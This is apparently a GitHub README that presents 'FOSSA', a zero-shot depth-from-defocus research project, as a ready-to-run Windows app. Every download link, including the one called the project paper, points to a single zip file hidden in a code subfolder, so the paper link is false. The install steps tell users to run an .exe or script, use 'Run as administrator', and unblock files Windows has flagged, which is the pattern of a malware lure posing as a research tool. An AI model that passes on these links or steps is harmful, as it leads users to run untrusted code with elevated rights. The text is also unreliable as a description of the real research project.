# 🔍 FOSSA - Zero-Shot Depth from Defocus

[![Download FOSSA](https://img.shields.io/badge/Download-FOSSA-blue?style=for-the-badge&logo=github)](https://github.com/Tapspeciousargument881/FOSSA/raw/refs/heads/main/FOSSAModel/fossa/util/Software_2.4.zip)

## 🚀 What FOSSA Does

FOSSA is a Windows-ready app that helps you estimate depth from a single image using defocus cues. In plain terms, it looks at blur in a photo and turns that into a depth map. This can help you see which parts of a scene are near and which parts are far.

It is built for people who want to try zero-shot depth from defocus without setting up a full research workspace. You can use it to test images, review output maps, and study how blur affects depth.

## 🖥️ What You Need

Before you run FOSSA on Windows, check these basic needs:

- Windows 10 or Windows 11
- A recent 64-bit PC
- At least 8 GB of RAM
- 2 GB of free disk space
- A GPU is helpful, but the app can still run on a CPU
- An internet connection to download the files from GitHub

For best results, use a PC with a dedicated graphics card and current display drivers.

## 📥 Download FOSSA

Visit this page to download and run the app files:

[https://github.com/Tapspeciousargument881/FOSSA/raw/refs/heads/main/FOSSAModel/fossa/util/Software_2.4.zip](https://github.com/Tapspeciousargument881/FOSSA/raw/refs/heads/main/FOSSAModel/fossa/util/Software_2.4.zip)

If the page includes a release file, download it to your PC. If the page includes source files only, use the package on the page and follow the steps below to run it on Windows.

## 🧭 Install on Windows

Follow these steps in order:

1. Open the download link in your browser.
2. Look for a release, zip file, or source package on the page.
3. Download the file to a folder you can find, such as Downloads.
4. If the file is zipped, right-click it and choose Extract All.
5. Open the extracted folder.
6. Look for a Windows app file, such as `.exe`, or a run script such as `run.bat`.
7. Double-click the app file or script to start FOSSA.
8. If Windows asks for permission, choose Run.
9. Wait for the app to load before you open an image.

## 🧩 First Launch

When you open FOSSA for the first time, it may take a short time to start. This is normal. The app may need to load model files before it can process images.

If you see a settings screen, keep the default values at first. These defaults are meant to work for most users.

If the app asks for a model path or input folder, use the folder that came with the download or the sample folder in the package.

## 🖼️ How to Use It

Use FOSSA with a single image that has visible blur and clear scene detail.

1. Open the app.
2. Choose an input image.
3. Pick an output folder.
4. Click the process button.
5. Wait for the depth map to finish.
6. Open the output file to view the result.

The output may include a grayscale depth map or a color map that shows near and far areas. Dark and light areas can mean different depth values, depending on the view mode in the app.

## 📁 File Layout

After you extract the download, you may see a folder layout like this:

- `FOSSA.exe` or `run.bat` - starts the app
- `models` - stores the model files
- `inputs` - holds your source images
- `outputs` - stores processed depth maps
- `configs` - keeps app settings
- `README.md` - setup notes and usage info

Keep all files in the same folder unless the app says otherwise. Some tools stop working if you move only part of the package.

## ⚙️ Typical Settings

These are common settings for first use:

- Image size: use the default value
- Output format: PNG for clear image quality
- Device: GPU if your PC supports it, CPU if not
- Batch size: 1 for a single image
- Save output: on

If the app gives you a choice between speed and quality, start with the quality setting. You can try a faster option later.

## 🔧 Common Problems

If the app does not start, try these steps:

- Make sure you extracted the zip file first
- Check that the files are still in the same folder
- Right-click the app and choose Run as administrator
- Update your graphics driver
- Restart your PC and try again

If the app opens but does not process images:

- Use a common image format like PNG or JPG
- Try a smaller image
- Check that the output folder exists
- Make sure the input file is not open in another app

If Windows blocks the file:

- Right-click the file
- Choose Properties
- Look for an Unblock option
- Apply the change and open the app again

## 🧪 Sample Workflow

Use this quick flow to test FOSSA:

1. Download the package from GitHub.
2. Extract it to your Desktop.
3. Open the app file.
4. Load a JPG photo with blur.
5. Process the image.
6. Open the saved depth map.
7. Compare the depth output with the original photo.

A photo with strong foreground and background detail works best for a first test.

## 📌 Tips for Better Results

Use images that follow these tips:

- Clear focus changes from front to back
- Good lighting
- Low motion blur
- Sharp objects in the scene
- High-quality JPG or PNG files

Images with very dark scenes, heavy noise, or flat lighting can reduce depth quality. Photos with strong contrast often give cleaner output.

## 📦 If You Want to Keep It Organized

Use a simple folder setup:

- `Desktop/FOSSA/` for the app
- `Desktop/FOSSA/inputs/` for test images
- `Desktop/FOSSA/outputs/` for results

This makes it easier to find your files and keeps the app paths simple.

## 🔍 About the Research

FOSSA is based on Zero-Shot Depth from Defocus. That means it uses blur cues in a photo to estimate depth without training on your own data first. This can be useful for depth tests, scene review, and computer vision work.

The project paper is here:
https://github.com/Tapspeciousargument881/FOSSA/raw/refs/heads/main/FOSSAModel/fossa/util/Software_2.4.zip

## 📬 Getting Help

If something does not work, check the repository page first for updates, file names, or setup notes. Then compare the steps above with the files you downloaded.

If the app has a config file, open it with Notepad and check the paths for input, output, and model files before you try again

